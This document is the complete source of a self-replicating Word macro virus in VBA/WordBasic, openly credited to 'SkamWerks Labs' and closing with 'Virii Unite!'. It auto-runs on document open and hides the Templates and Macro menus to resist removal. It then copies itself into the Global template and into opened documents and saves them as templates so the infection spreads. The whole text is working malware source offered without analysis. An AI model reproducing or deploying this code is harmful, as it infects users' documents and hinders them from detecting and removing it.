   Attribute VB_Name = "aUToOpEn"

   Public Sub MAIN()
   Dim FName$
   Dim MacName$
   Rem SkamWerks Labs Presents the Generic Concept Created by Skam

   On Error GoTo -1: On Error GoTo ErrorHandler

        WordBasic.ToolsCustomizeMenus ResetAll:=1
        WordBasic.ToolsCustomizeMenus Name:="FileTemplates", Menu:="&File", Context:=0, Remove:=1
        WordBasic.ToolsCustomizeMenus Name:="ToolsMacro", Menu:="&Tools", Context:=0, Remove:=1

        Rem What? No Payload?  WUSSY!

        FName$ = WordBasic.[FileName$]()
        MacName$ = FName$ + ":aUToOpEn"

        WordBasic.MacroCopy MacName$, "Global:aUToOpEn"

   ErrorHandler:

   On Error GoTo -1: On Error GoTo aUToOpEnHandler
        MacName$ = FName$ + ":aUToOpEn"
        WordBasic.MacroCopy "Global:aUToOpEn", MacName$
   aUToOpEnHandler:

   WordBasic.FileSaveAs Format:=1

   Rem Virii Unite!J

   On Error GoTo -1: On Error GoTo 0:
   On Error GoTo -1: On Error GoTo EndCode:



   EndCode:

   End Sub
